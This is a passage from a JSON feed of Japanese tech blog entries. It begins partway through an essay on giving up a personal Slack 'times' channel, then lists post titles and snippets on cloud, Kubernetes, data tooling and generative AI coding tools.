― これはまさに「V字型の関係」の量産装置である。私のチャンネルを見ているAさんとBさんが、そこでのやり取りを通じて直接つながることは稀だ。むしろ、それぞれが私との1対1の関係に終始する。リモートワーク環境下では、この構造的欠陥はより顕著になる。物理的な偶発的出会いが失われた今、意図的に「三角形」を作り出す仕組みが必要だ。しかし、個人チャンネルという形式は、その本質において中心化を促進し、分散化を阻害する。一方、チームチャンネルや技術雑談チャンネルでは、参加者同士が自然に相互作用する。同じ疑問に対して複数人が異なる視点でアドバイスし、そこから新たな議論が派生する。これこそが知識の三位一体化であり、創造性を高める組織の在り方だ。論理的思考の階層性がV字関係を生み出すという洞察も重要だ。分解と整理を基本とする思考フレームワークは、産業時代には機能したが、知識創造の時代には限界がある。生成AIによる知識の民主化が進む今、組織は階層的構造から、より有機的なネットワーク構造へと進化すべき時を迎えている。私の選択は、V字から三角形へのシフトである。個人の承認欲求を満たす場から、集合知が生まれる場へ。ネットワークのハブとしての自己から、ネットワークの一部としての自己へ。これは単なるツールの変更ではなく、組織内での存在様式の根本的な転換を意味している。時間という有限資源の配分問題個人チャンネルは「アテンション・エコノミー（注意の経済）」における構造的矛盾を抱えている。組織の成長に伴い、情報チャンネルは線形に増加するが、個人の処理能力は一定のまま。この非対称性は、必然的に選別と排除のメカニズムを生み出す。より深刻なのは、この選別が生む不可視の階層構造だ。物理的空間における排除は可視的だが、デジタル空間における排除は不可視でありながら、より根深い分断を生む。参加の自由が保証されているがゆえに、不参加や選択的参加が生む格差は個人の責任に帰されやすい。アテンション・エコノミーのジレンマ　〈関心〉を奪い合う世界に未来はあるか作者:山本 龍彦KADOKAWAAmazon心理的安全性のパラドックス個人チャンネルは心理的安全性を高めるために導入されながら、逆にそれを脅かす装置にもなりうる。これは、親密性と公開性の両立不可能性に起因する。親密な空間であるがゆえに生まれる無防備な発言は、公開空間であるがゆえに永続し、検索可能となる。私自身も経験したことだが、他者への批判を目撃することの疲弊は想像以上に大きい。社内SNS化した空間では、建設的批判と破壊的批判の境界が曖昧になりやすい。「事実と解釈を分ける」という個人的努力に依存する構造は、そもそも持続可能ではない。古参メンバーとしての責任組織の初期メンバーは、文化の形成者であると同時に、その変革の阻害要因にもなりうる。そこまで古参ではないが組織が急拡大しているので相対的に古参である。私の存在が、新しいメンバーにとっての見えない圧力になっていないか。私の発言が、本来生まれるべき多様な声を抑圧していないか。ここで重要なのは、timesの価値は世代や在籍期間によって大きく異なるという認識だ。若手や入社直後のメンバーにとって、timesは今でも有効なツールとして機能している。組織への順応過程において、インフォーマルな発信空間は心理的安全性を提供し、自己開示を通じた関係構築を促進する。新しいメンバーが組織文化を理解し、自分の居場所を見つけるための重要な装置として、その価値は否定できない。また、社長や事業部長といった経営層にとっても、timesは別の意味で価値を持つ。階層的な距離が生む心理的障壁を低減し、人間的な側面を共有することで組織全体の心理的安全性を高める効果がある。経営層の思考プロセスや日常的な悩みが可視化されることで、「雲の上の存在」から「同じ人間」へと認識が変わる。これは特に急成長する組織において、上下の分断を防ぐ重要な機能となりうる。しかし、長く在籍する中間層の一般社員である私の場合、その影響力は異なる性質を持つ。経営層のような明確な役割や責任に基づく発信ではなく、「古参であること」自体が生む見えない権威性が問題となる。この非対称性を自覚したとき、退場もまた一つの貢献となる。若手が自由に発信し、経営層との健全な対話が生まれる空間を守るためにも、中間層の古参は適切なタイミングで身を引く必要がある。個人の節度や自制に依存するシステムは、本質的に脆弱だ。構造的に承認欲求を刺激し、注意力を奪い、関係性を歪めるメカニズムの中で、個人の倫理にどこまで期待できるだろうか。むしろ、そうした個人的努力を不要とする構造へと移行することこそが、組織の進化ではないか。私のチャンネルには、長年の蓄積がある。試行錯誤の痕跡、成功と失敗の記録、人間関係の履歴。これらは個人にとっての財産であると同時に、組織にとっての負債にもなりうる。過去の堆積が未来の可能性を制約するとき、断捨離は創造的行為となる。生成AI時代における組織内コミュニケーション知識のオープン化は、組織の存在理由そのものを問い直している。もはや情報の独占や階層的な知識伝達では、価値創造は不可能だ。必要なのは、多様な視点が交差し、予期せぬ組み合わせが生まれる「場」の設計だ。個人チャンネルは、表面的には情報の民主化に貢献しているように見える。しかし実際には、情報の断片化と選択的可視性による新たな非対称性を生み出している。全体性の把握が不可能な状況下では、部分最適化が進行し、組織は分断される。これからの組織に必要なのは、個人の発信力ではなく、集団としての知識創造力だ。それは、中心化されたネットワークではなく、分散化されたメッシュとして知識が循環する仕組みから生まれる。個から全体へ、閉鎖から開放へ、所有から共有へ。この転換こそが、知識社会における組織の生存戦略となる。卒業という選択すべてのシステムには寿命がある。それを認めることは敗北ではなく、成熟の証である。私にとってのtimesは、その役割を終えた。これは組織の成長を祝福し、新しい段階への移行を受け入れる儀式でもある。個人チャンネルには組織の成長と反比例する有効性がある。規模の拡大は必然的にシステムの限界をもたらす。これは、あらゆる中心化されたネットワークが直面する普遍的な課題だ。組織の成長を喜びながら、その成長に適応できないシステムに固執することは、成長そのものを阻害する。興味深いのは、この空間から離脱した時に感じる「喪失感の不在」だ。むしろ、制約がもたらす創造性の向上を実感している。これは、無限の選択肢よりも適切な制約が人間の創造性を高めるという、古典的な原理の現れかもしれない。「代替可能性」という認識は重要だ。心理的安全性も、知識共有も、偶発的な創発も、すべて異なる構造で実現可能だ。むしろ、より持続可能で公平な形で。個人的な発信空間から、より構造化されたコミュニケーションチャンネルへ。この移行は、組織が次のフェーズに進むための必要な進化だと信じている。終わりに変化を恐れず、執着を手放し、新しい形を模索する。それが成長する組織の中で生きるということだ。私のこの選択は、単なる個人的な決断ではない。V字型の関係から三角形の関係へ、情報の独占から知識の循環へ、個人の承認欲求から集合知の創発へ。これは、知識社会が求める組織変革の、小さな、しかし確かな一歩だ。真の課題は特定のツールの有無ではなく、組織における関係性の質にある。健全な組織文化は、ツールを超えて、人と人との相互作用の中から生まれる。私のこの選択が、組織のコミュニケーション構造について考える一つのきっかけになれば幸いである。これまでの対話に感謝を込めて。そして、新しい形での再会を楽しみにしている。参考Slackのtimesのメリット・デメリットについて改めて考えてみる｜斎藤 雅史Slackの分報チャンネル使うのやめた - stefafafan の fa は3つですSlackの分報チャンネル使うのを再開していた - stefafafan の fa は3つですまたSlackでtimesを始めてしまった｜ばんくし分報を導入して3年経ったので振り返る - FRTKL","isoDate":"2025-08-04T08:35:59.000Z","dateMiliSeconds":1754296559000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"BigQueryのパーティション分割テーブルでTIMESTAMPでエラーが出るときの理由","link":"https://zenn.dev/nedoko_dok0dko/articles/b6d8df76854c0a","contentSnippet":"whatBigQueryでパーティション分割テーブルを作成する際、パーティショニングを設定することができるが、TIMESTAMPを利用しようとするとエラーが出る場合がある「公式ドキュメントでは設定できると記載があるが、エラーが出るのはなぜなのか?」 これについて調べてみたログ BigQueryのパーティショニングについてhttps://cloud.google.com/bigquery/docs/partitioned-tables?hl=jaBQでパーティションテーブルを作る際に、パーティショニングを設定する。これは、公式ドキュメントでは次の型から設定することがで...","isoDate":"2025-07-31T11:40:53.000Z","dateMiliSeconds":1753962053000,"authorName":"seno","authorId":"seno"},{"title":"[KubeCon Japan 2025] Composable Disaggregated Infrastructure(CDI)とは? Kubernetes基盤レイヤーでのHWリソース動的管理","link":"https://sreake.com/blog/kubecon-japan-2025-composable-disaggregated-infrastructure/","contentSnippet":"2025年度の新卒エンジニアとして株式会社3-shakeに入社いたしました、荒木と申します。私はまだまだKubernetesの初学者であり、日々の学習を通じてスキルを向上させていきたいと考えています。 そんな折、先日、K […]The post [KubeCon Japan 2025] Composable Disaggregated Infrastructure(CDI)とは? Kubernetes基盤レイヤーでのHWリソース動的管理 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-07-30T05:12:48.000Z","dateMiliSeconds":1753852368000,"authorName":"Sreake","authorId":"Sreake"},{"title":"[KubeCon 2025 EU/JP] Kubernetes と 宇宙","link":"https://sreake.com/blog/kubecon-2025-eu-jp-kubernetes-and-universe/","contentSnippet":"はじめに 宇宙は、人類にとって長年の探求対象であり、近年は特にKubernetesをはじめとするクラウドネイティブ技術によって、そのデータ処理とコンピューティングの方法が変革され、新たなフロンティアが拓かれつつあります。 […]The post [KubeCon 2025 EU/JP] Kubernetes と 宇宙 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-07-30T02:04:28.000Z","dateMiliSeconds":1753841068000,"authorName":"Sreake","authorId":"Sreake"},{"title":"ローカルLLM入門！LM Studioをバックグラウンドで実行しObsidianと連携する","link":"https://zenn.dev/r4ynode/articles/local-llm-intro-with-obsidian","contentSnippet":"はじめに生成AI盛り上がってますね。私は置いていかれています。そんな私、奇遇なことに30コアGPUを積んだMacBookを持っているではないですか。本当は最近キラキラなAI（Devin, Claude Codeなど）を使いたいのですが、時代に逆行してローカルLLMに入門してみます。この記事では以下のことをします。LM Studioに入門Obsidianと連携LM Studio CLIを使ってバックグラウンドで実行一応、ObsidianというのはMarkdownのノートアプリです。本記事では詳しく解説しません。 デモ本記事の手順を最後まで実施すると、LM St...","isoDate":"2025-07-27T09:00:01.000Z","dateMiliSeconds":1753606801000,"authorName":"Reito Koike","authorId":"reito"},{"title":"Go言語におけるオブジェクト指向の実装(classベースとの違い)","link":"https://zenn.dev/takehiro1111/articles/go_object_oriented","contentSnippet":"1.読者想定Goの初学者レベル(私含め)Goとclassを用いたオブジェクト指向の実装をする他言語と書き方を比較整理したい方。!思考の整理のために本記事を書いていますので、独特な表現がある場合はあまり気にしないでください。コードベースでの整理をしたいため、オブジェクト志向についての言及はしておりません。Python,TypeScriptとの比較は私自身のスキルセットの影響のため、比較する際の言語選定に深い意味はないです。\xa0 2.classで書く場合classがデータ（property）と振る舞い（method）をカプセル化し、継承によ...","isoDate":"2025-07-27T03:30:06.000Z","dateMiliSeconds":1753587006000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"転職したらAWS MCPサーバーだった件","link":"https://speakerdeck.com/nwiizo/zhuan-zhi-sitaraaws-mcpsabadatutajian","contentSnippet":"「 転職したらMCPサーバーだった件」というタイトルで登壇したことがある。本日は「JAWS-UG SRE支部 #13 つよつよSREの秘伝のタレ」というなんとなく強そうなイベントで登壇しました。\\r\\r\uD83D\uDD0D イベント詳細:\\r- イベント名: JAWS-UG SRE支部 #13 つよつよSREの秘伝のタレ\\r- 公式URL: https://jawsug-sre.connpass.com/event/358781/\\r- ハッシュタグ: https://x.com/search?q=%23jawsug_sre&f=live\\r- 参考資料①: https://speakerdeck.com/nwiizo/zhuan-zhi-sitaramcpsabadatutajian","isoDate":"2025-07-23T04:00:00.000Z","dateMiliSeconds":1753243200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"【開催報告】2025年夏ワークショップ「クラウドネイティブ技術を体験しよう！」を開催しました","link":"https://sreake.com/blog/2025-summer-workshop-report/","contentSnippet":"はじめに 2025年7月3日（木）・4日（金）の2日間、株式会社スリーシェイクの夏ワークショップを開催しました。今回は13名の学生の皆さんにご参加いただき、クラウドネイティブ技術の世界を体験していただきました。 \uD83D\uDCF8 ワー […]The post 【開催報告】2025年夏ワークショップ「クラウドネイティブ技術を体験しよう！」を開催しました first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-07-21T23:00:00.000Z","dateMiliSeconds":1753138800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Agent Development KitとAgent Engineを使ってVertex AI Agent Builderに入門してみる","link":"https://sreake.com/blog/vertex-ai-agent-builder-with-agent-development-kit-and-agent-engine/","contentSnippet":"1. 概要 本記事では、Googleが提供するAgent Development Kit (ADK) とAgent Engineを利用して、AIエージェントの構築方法を紹介しつつ、Vertex AI Agent Buil […]The post Agent Development KitとAgent Engineを使ってVertex AI Agent Builderに入門してみる first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-07-21T22:00:00.000Z","dateMiliSeconds":1753135200000,"authorName":"Sreake","authorId":"Sreake"},{"title":"技術イベントのメモはOpenAI WhisperとGemini CLIに任せる","link":"https://zenn.dev/r4ynode/articles/audio-transcription-using-openai-whisper","contentSnippet":"イベントの内容覚えてますか？イベントに参加しても内容を覚えていることって少なくないですか？イベントに参加しただけで満足して、特に生産的な活動に活かすことなく終わってしまうことがあると思います。また、登壇者の話を必死にメモしようとして、肝心な内容を聞き逃してしまうこともよくあります。イベント参加は、個人的には学習のモチベーションアップに繋がるので良いのですが、せっかくなら学んだ内容をしっかり定着させたいと思いました。そこで、YouTubeや現地の音声を文字起こしして振り返りたいと考えたものの、理想的なツールが見つからなかったので自分で作ってみることにしました。この記事では、Op...","isoDate":"2025-07-21T00:00:01.000Z","dateMiliSeconds":1753056001000,"authorName":"Reito Koike","authorId":"reito"},{"title":"Analytics Development Lifecycle（ADLC）について","link":"https://zenn.dev/nedoko_dok0dko/articles/19d54d6c57cd93","contentSnippet":"whatdbt Labsが提唱する「Analytics Development Lifecycle(ADLC)」について調べてみたことやわかったことの個人ログ!⚠️ 元記事が英語であり、それを翻訳&個人的意訳しているので少々文章が読みにくくなっているかもしれません Analytics Development Lifecycle（ADLC）とは？※ 日本語にすると「開発分析ライフサイクル」となる?https://www.getdbt.com/resources/the-analytics-development-lifecycle組織がデータ分析をより良く...","isoDate":"2025-07-18T10:59:32.000Z","dateMiliSeconds":1752836372000,"authorName":"seno","authorId":"seno"},{"title":"SRE NEXT 2025 資料一覧","link":"https://zenn.dev/r4ynode/articles/srenext2025-documents","contentSnippet":"本記事についてSRE NEXT 2025に参加しました。自分で後で振り返る用に、公開されている発表資料を視認範囲の中で集めました。とりあえずタイトルをすべて羅列しているので、見つけられていないものに関しては空白になっています。新しく資料が公開、発見されたら追記します。 記載順スケジュール時間に沿って記載しています。https://sre-next.dev/2025/schedule/ DAY 1: 7/11 - 資料一覧 Fast by Friday: Making performance analysis fast and easy資料は見つけられませんでした...","isoDate":"2025-07-11T18:00:00.000Z","dateMiliSeconds":1752256800000,"authorName":"Reito Koike","authorId":"reito"},{"title":"AI時代でもソフトウェア設計の重要性は変わらない(視聴レポ)","link":"https://zenn.dev/r4ynode/articles/event-report-ai-era-domain-design","contentSnippet":"はじめに先日、以下のオンラインイベントを視聴しました。本記事では、イベント内容を踏まえた個人的な学びや気づきを簡単にまとめます。単なる内容の羅列ではなく、自分の言葉で振り返ります。https://forkwell.connpass.com/event/356295/!イベントの注意事項に則り記事を執筆していますが、内容に問題がある場合は速やかに修正・削除いたします。 イベント資料登壇者の方々が公開されているイベント資料はこちらです。https://speakerdeck.com/minodriven/ai-good-code-bad-codehttps://spe...","isoDate":"2025-07-11T01:00:06.000Z","dateMiliSeconds":1752195606000,"authorName":"Reito Koike","authorId":"reito"},{"title":"mypy: type checker for python","link":"https://daisuke1024akagawa.medium.com/mypy-type-checker-for-python-0cafa6124ad6?source=rss-c54ac439ad2b------2","isoDate":"2025-07-09T12:51:38.000Z","dateMiliSeconds":1752065498000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"スリーシェイク、NVIDIA Inception に参加","link":"https://sreake.com/blog/nvidia-inception/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、テクノロジーの進歩によって業界に革命を起こすスタートアップ企業を育成するプログラムであるNVIDIA Inceptionに参加しました。The post スリーシェイク、NVIDIA Inception に参加 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-07-07T10:29:15.000Z","dateMiliSeconds":1751884155000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Obsidian上でGeminiを使う理想環境の探求","link":"https://zenn.dev/r4ynode/articles/obsidian-how-to-use-geminicli","contentSnippet":"はじめにObsidianとGemini CLIを組み合わせた知的生産の効率化手法が注目されています。プロジェクト専用のGEMINI.mdを作成してVault直下に配置し、Gemini CLIを起動することで、ノート作成や情報整理のワークフローを大幅に改善できるというものです。しかし、Obsidianでノートを書きながら別途ターミナルを開いてアプリを行き来するやり方は、思考の流れを分断しがちです。現状のObsidianのAI機能は発展途上であり、多くのユーザーがCursorやGemini CLIなどの外部ツールを併用しているのが実情でしょう。理想的なのは、ノート作成や情報整理の...","isoDate":"2025-07-06T09:00:02.000Z","dateMiliSeconds":1751792402000,"authorName":"Reito Koike","authorId":"reito"},{"title":"ローカルエディタからワンクリックでGoogle Cloud Workstationに接続する方法","link":"https://qiita.com/aminevg/items/27f55b1809b6629567f6","contentSnippet":"背景皆さんは、Google Cloud Workstationsという製品はご存知ですか？「フルマネージド開発環境」を提供していて、セキュリティの強化や開発者のオンボーディングの加速を期待できる製品です。クラウド上の開発環境ということもあって、ブラウザ内での開...","isoDate":"2025-07-02T13:43:33.000Z","dateMiliSeconds":1751463813000,"authorName":"Amine Ilidrissi","authorId":"amine"},{"title":"Obsidianを導入すべきかを本気で考える","link":"https://zenn.dev/r4ynode/articles/obsidian-vs-other-note-apps","contentSnippet":"はじめに巷でObsidianというMarkdownエディタが流行っていますね。Obsidianと生成AIを組み合わせた使い方で注目を浴びています。流行りに乗っかってObsidianを導入してみましたが、ノート同士をリンクさせて何が良いのか全く理解できませんでした。調べると、ObsidianとはZettelkastenというノート術を実践できるアプリケーションのようです。ここで、Obsidianについての説明を公式ページから抜粋します。個人的なメモから日記、ナレッジベース、プロジェクト管理まで、Obsidianはアイデアを考案して整理するためのツールを提供します。リンク：...","isoDate":"2025-07-02T02:50:58.000Z","dateMiliSeconds":1751424658000,"authorName":"Reito Koike","authorId":"reito"},{"title":"「あつまれ Lookerの森 #3」 オンサイト行ってきました記録","link":"https://zenn.dev/nedoko_dok0dko/articles/5da95def70336b","contentSnippet":"what6/27に開催された「あつまれ Lookerの森 #3」のオンサイト参加ログです当日の雰囲気や登壇者の方々の発表内容等を簡単にまとめたものになります あつまれ Lookerの森とはJagu\'e\'rのデータ利活用分科会が主催するLookerにフォーカスを当てた勉強会です※ Jagu\'e\'r: Google Cloudのユーザー会。Lookerだけでなく様々なGoogle Cloud製品に関したコミュニティやイベントを企画・開催しています今回は3回目ということでしたが、私は初めての参加でした。コミュニティイベントというのも初参加だったため、「どんな雰囲気なのだ...","isoDate":"2025-06-30T11:21:02.000Z","dateMiliSeconds":1751282462000,"authorName":"seno","authorId":"seno"},{"title":"Gemini Code Assist for GitHubでPrisma ORMのデータモデリングをレビューする","link":"https://sreake.com/blog/gemini-code-assist-prisma-review/","contentSnippet":"一般的にデータベースの変更はアプリケーションの変更に比べると影響が大きく、慎重な対応が求められます。またcreatedAtのデフォルト値など、実行タイミングにより値が変動する設定をし忘れた場合、元の値を復元することは困難 […]The post Gemini Code Assist for GitHubでPrisma ORMのデータモデリングをレビューする first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-30T06:59:22.000Z","dateMiliSeconds":1751266762000,"authorName":"Sreake","authorId":"Sreake"},{"title":"スリーシェイク所属のエンジニアが「2025 Japan All AWS Certifications Engineers」に選出","link":"https://sreake.com/blog/2025-japan-all-aws-certifications-engineers/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、スリーシェイク所属のエンジニア鈴木 勝史が、「2025 Japan All AWS Certifications Engineers」に選出されたことをお知らせします。The post スリーシェイク所属のエンジニアが「2025 Japan All AWS Certifications Engineers」に選出 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-30T01:00:00.000Z","dateMiliSeconds":1751245200000,"authorName":"Sreake","authorId":"Sreake"},{"title":"生成AIで小説を書くためにプロンプトの制約や原則について学ぶ / prompt-engineering-for-ai-fiction ","link":"https://speakerdeck.com/nwiizo/prompt-engineering-for-ai-fiction","contentSnippet":"諸君、聞かれよ。本日、私は「女オタ生成AIハッカソン2025夏東京」なる前代未聞の催しにて、生まれて初めて登壇することと相成った。かつての私は純朴なプログラマーであり、「変数名を30分悩んだ挙句、結局tmpにする」という、実に平凡な悩みを抱える程度の技術者であったのだ。\\r\\r歳月は容赦なく流れ、今や私はプロンプトエンジニアリングという名の魔境に足を踏み入れた哀れな求道者となり果てた。昨夜も丑三つ時まで、私は薄暗い書斎でディスプレイの冷たき光に照らされながら、「なぜ生成AIは『簡潔に』と百回唱えても、源氏物語の長文を生成するのか」という哲学的難題と格闘していたのである。\\r\\r30分という持ち時間に対し50枚のスライドを用意するという、まるで賽の河原で石を積む如き徒労に及んでいる。そのうち半分は「プロンプトという名の現代呪術における失敗例集」と題した、私の苦悩の結晶である。ああ、AIとの対話とは、かくも人間の正気を奪うものなのか。\\r\\r---\\r\\rブログも書いた。\\r生成AIで物語を書くためにプロンプトの制約や原則について学ぶ、という話をしてきました #女オタ生成AI部\\rhttps://syu-m-5151.hatenablog.com/entry/2025/06/30/171149","isoDate":"2025-06-29T04:00:00.000Z","dateMiliSeconds":1751169600000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Snowflakeで始めるリージョン間データ共有","link":"https://sreake.com/blog/inter-region-data-sharing-with-snowflake/","contentSnippet":"はじめに 組織内のSnowflakeアカウント同士で安全にリージョン間データ共有をするなら、LIST機能のOrganizational listingsを使うのが非常におすすめです。 この記事ではSnowflakeがサポ […]The post Snowflakeで始めるリージョン間データ共有 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-27T10:08:28.000Z","dateMiliSeconds":1751018908000,"authorName":"Sreake","authorId":"Sreake"},{"title":"論文紹介：『Commercial LLM Agents Are Already Vulnerable to Simple Yet Dangerous Attacks』","link":"https://sreake.com/blog/commercial-llm-agents-are-already-vulnerable-to-simple-yet-dangerous-attacks/","contentSnippet":"今回は、LLMエージェントシステムの脆弱性に関して述べられている論文の紹介をさせていただきます。3-shakeではさまざまな勉強会が開かれており、今回紹介する論文も勉強会で取り上げた題材となっています。エージェントシステ […]The post 論文紹介：『Commercial LLM Agents Are Already Vulnerable to Simple Yet Dangerous Attacks』 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-27T07:55:50.000Z","dateMiliSeconds":1751010950000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Terraformを使ってVPC内のCloud Runサービス間で通信させる","link":"https://qiita.com/aminevg/items/4912c95b795c6739d703","contentSnippet":"背景Cloud Runはサーバーレスでコンテナを動かせる便利なサービスですが、複数のサービスを連携させようとすると、ネットワーク構成で悩むことがあります。例えば、フロントエンドは一般公開し、バックエンドは内部ネットワークからのみアクセス可能にしたい場合VPC内の...","isoDate":"2025-06-27T07:26:55.000Z","dateMiliSeconds":1751009215000,"authorName":"Amine Ilidrissi","authorId":"amine"},{"title":"AI にどんなコードを書かれても大丈夫！DevContainer+mise で築く「壊されても安心でユニバーサル」な開発環境","link":"https://sreake.com/blog/safe-universal-dev-env-with-devcontainer-mise/","contentSnippet":"はじめに：生成 AI 時代の新たな悩み 「ChatGPT、このバグを直して！」 「GitHub Copilot、この機能を実装して！」 そんなふうに生成 AI に頼んでコードを書いてもらったら、気づいたら開発環境がぐちゃ […]The post AI にどんなコードを書かれても大丈夫！DevContainer+mise で築く「壊されても安心でユニバーサル」な開発環境 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-26T13:16:14.000Z","dateMiliSeconds":1750943774000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Gemini cli が出たっぽいので cloud run deploy までやってみるぞ","link":"https://zenn.dev/satohjohn/articles/4d205e445714cf","contentSnippet":"概要Gemini cli ってのが出ました。https://github.com/google-gemini/gemini-cli基本的には Gemini code assist をローカルでも使えるようなイメージを感じています。（間違ってたらすいません)https://blog.google/technology/developers/introducing-gemini-cli-open-source-ai-agent/30分程度とりま調べた限りでまとめます。無料という言葉に人間は弱いのだよ。 表題の通りやってみる。とりま npm -g でインストールしたら ge...","isoDate":"2025-06-25T16:15:27.000Z","dateMiliSeconds":1750868127000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Google CloudのPDEの更新がきたので受けてきましたよという話","link":"https://zenn.dev/nedoko_dok0dko/articles/74f196e3a1a84f","contentSnippet":"whatGoogle Cloud認定資格のProfessional Data Engineerの更新?が迫っていたので受験してきました記録2年ぶりの試験なので、当時との問題の違いとか個人的な所感とか…を簡単に受験結果は合格でした! Professional Data Engineerについてhttps://cloud.google.com/learn/certification/data-engineer?hl=jaGoogle Cloudの認定資格の一つGoogle Cloud製品におけるデータエンジニア領域の専門知識やスキルを問う試験【例】データ分析...","isoDate":"2025-06-24T10:43:47.000Z","dateMiliSeconds":1750761827000,"authorName":"seno","authorId":"seno"},{"title":"openhands cli で Gemini 2.5-flash を使って Cloud Run でアプリケーションをデプロイする","link":"https://zenn.dev/satohjohn/articles/720102a717eb1a","contentSnippet":"概要タイトルの通りのことをやってみるという企画です。claude code ってみんないうからうーんどうしよう、会社で使ってもらいたいけど Gemini 使いたいなーっていうのを見てたら openhands っていうのがあって、それの cli が良さそうということで、触ろうというモチベーション アプリケーションを作ってもらうとりま動かすだけをやってみますhttps://docs.all-hands.dev/usage/how-to/cli-modeflash でやっているのはめっちゃお金かかったらどうしようという気持ちからです。export CLOUDSDK_ACTI...","isoDate":"2025-06-20T16:06:04.000Z","dateMiliSeconds":1750435564000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"MultiKueueを利用した外部クラスタへのジョブスケジューリング","link":"https://sreake.com/blog/multikueue-job-scheduling-to-external-cluster/","contentSnippet":"この記事の情報は2025年5月時点(v0.11.4)での情報をもとに作成しています。 Kueueのベータに昇格した機能の一つであり、外部クラスタへのスケジューリング機能として注目されるMultiKueueについて解説しま […]The post MultiKueueを利用した外部クラスタへのジョブスケジューリング first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-19T04:15:27.000Z","dateMiliSeconds":1750306527000,"authorName":"Sreake","authorId":"Sreake"},{"title":"2025-06-20 PrivateLinkがNLBなしで作れるようになり便利になった","link":"https://speakerdeck.com/masasuzu/2025-06-20-privatelinkkanlbnasitezuo-reruyouninaribian-li-ninatuta","contentSnippet":"","isoDate":"2025-06-19T04:00:00.000Z","dateMiliSeconds":1750305600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Claude Code どこまでも/ Claude Code Everywhere","link":"https://speakerdeck.com/nwiizo/claude-everywhere","contentSnippet":"僕がClaude Codeに初めて触れたのは、2025年の春だった。生成AIにはすでに慣れ親しんでいた。流行に乗り遅れてはいけないと必死に勉強し、エディターの補完機能やコード生成ツールとして日常的に活用していた。ただ、当時の僕にとってそれはまだ「CLIで動く便利なコーディング支援ツール」程度の認識でしかなかった。「AIが90%のコードを自動生成」という謳い文句を見ても、半信半疑でターミナルを開いたのを覚えている。\\r\\rイベント名:【オフライン開催】KAGのLT会 #6 〜御社のエンジニア育成どうしてる!? スペシャル〜\\r公式URL: https://kddi-agile.connpass.com/event/357862/\\r\\r「実装」から「設計」へのパラダイムシフト というより無限に体力が必要という話をした \\rhttps://syu-m-5151.hatenablog.com/entry/2025/06/19/102529\\r\\r【参考文献】\\r  - 公式ドキュメント\\r    - Claude Code 公式サイト https://www.anthropic.com/claude-code\\r    - Claude Code ドキュメント https://docs.anthropic.com/en/docs/claude-code/overview\\r    - Claude Code Best Practices https://www.anthropic.com/engineering/claude-code-best-practices\\r    - 抽象化をするということ - 具体と抽象の往復を身につける https://speakerdeck.com/soudai/abstraction-and-concretization\\r    - How I Use Claude Code https://spiess.dev/blog/how-i-use-claude-code\\r    - LLMの制約を味方にする開発術 https://zenn.dev/hidenorigoto/articles/38b22a2ccbeac6\\r    - Claude Code版Orchestratorで複雑なタスクをステップ実行する https://zenn.dev/mizchi/articles/claude-code-orchestrator\\r    - Agentic Coding Recommendations https://lucumr.pocoo.org/2025/6/12/agentic-coding/\\r    - Claude Codeに保守しやすいコードを書いてもらうための事前準備 https://www.memory-lovers.blog/entry/2025/06/12/074355\\r    - Claude Codeによる技術的特異点を見届けろ https://zenn.dev/mizchi/articles/claude-code-singularity-point","isoDate":"2025-06-18T04:00:00.000Z","dateMiliSeconds":1750219200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"SRE支援から見えてきたSREの核","link":"https://speakerdeck.com/kojake_300/srezhi-yuan-karajian-etekitasrenohe","contentSnippet":"","isoDate":"2025-06-12T04:00:00.000Z","dateMiliSeconds":1749700800000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Open Policy Containers(OPC)","link":"https://zenn.dev/tayusa/articles/2ade4dd1928937","contentSnippet":"Open Policy Containers(OPC)の前にOpen Policy Agent(OPA)https://www.openpolicyagent.org/クラウドネイティブ環境におけるポリシー適用のための汎用エンジンRegoという宣言型言語を用いてポリシーを記述するJSONやYAMLのような構造化されたデータを入力として受け取り、ポリシー評価の結果（許可/拒否など）を返す例: 全てのNamespaceに管理者を特定するためのownerラベルを必須にするpackage maindeny contains msg if {    # 対象リソース...","isoDate":"2025-06-12T02:27:15.000Z","dateMiliSeconds":1749695235000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"「セキュリティ・キャンプ 2025 全国大会」にスリーシェイク所属のエンジニアが講師として登壇","link":"https://sreake.com/blog/security-camp-2025/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）に所属のエンジニア水元 恭平が、「セキュリティ・キャンプ 2025 全国大会」に講師として登壇することをお知らせいたします。The post 「セキュリティ・キャンプ 2025 全国大会」にスリーシェイク所属のエンジニアが講師として登壇 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-06-09T01:00:00.000Z","dateMiliSeconds":1749430800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Oracle Database＠Google Cloudの紹介～ついに日本のリージョンも使えるようになったぞ！～","link":"https://sreake.com/blog/oracle-database-google-cloud-japan-launch/","contentSnippet":"2025年4月のGoogle Cloud Nextでの発表から2か月、ついにOracle Database＠Google 